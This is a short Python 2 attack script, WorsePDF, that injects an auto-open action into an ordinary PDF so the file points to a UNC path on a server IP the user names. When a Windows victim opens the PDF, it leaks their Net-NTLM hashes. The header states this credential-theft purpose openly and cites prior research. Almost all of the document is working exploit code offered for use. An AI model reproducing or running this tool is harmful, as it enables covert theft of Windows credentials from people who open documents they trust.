#
# WorsePDF
# Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines.
# Reference :
# https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/
# https://github.com/deepzec/Bad-Pdf
# By: 3gstudent
# License: BSD 3-Clause

import sys

def AddPayload(Data,ip):
    Payload = '/AA <</O <</F (\\\\\\\\' + ip + '\\\\test)/D [ 0 /Fit]/S /GoToE>>>>'
    index1 = Data.find('/Parent') + 13    
#    print "%x" % index1
    Newdata = Data[0:index1] + Payload + Data[index1:]   
    return Newdata

if __name__ == "__main__":
    print "WorsePDF - Turn a normal PDF file into malicious.Use to steal Net-NTLM Hashes from windows machines."

    print "Reference :"
    print "    https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/"
    print "    https://github.com/deepzec/Bad-Pdf"    
    print "Author: 3gstudent\n"

    if len(sys.argv)!=3:
        print ('Usage:')
        print ('    WorsePDF.py <normal PDF file Path> <ServerIP>')   
        sys.exit(0)    

    print "[*]NormalPDF: %s" % sys.argv[1]
    print "[*]ServerIP: %s" % sys.argv[2]
    
    file_object = open(sys.argv[1],'rb')
    try:
         all_the_text = file_object.read( )
    finally:
         file_object.close()

    Newdata = AddPayload(all_the_text,sys.argv[2])
    MaliciousPath = sys.argv[1] + '.malicious.pdf'
    
    print "[+]MaliciousPDF: %s" % MaliciousPath   
    file_object2 = open(MaliciousPath, 'wb')
    file_object2.write(Newdata)
    file_object2.close()
    print "[*]All Done"

